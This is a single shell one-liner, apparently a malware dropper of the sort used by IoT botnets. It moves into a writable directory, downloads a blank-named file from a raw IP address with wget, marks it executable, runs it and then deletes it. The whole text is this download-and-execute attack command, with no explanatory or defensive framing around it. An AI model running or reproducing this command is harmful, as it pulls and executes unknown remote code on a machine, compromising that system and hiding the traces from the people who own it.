cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://194.135.95.177/' '; chmod +x ' '; ./' '; rm -rf ' '
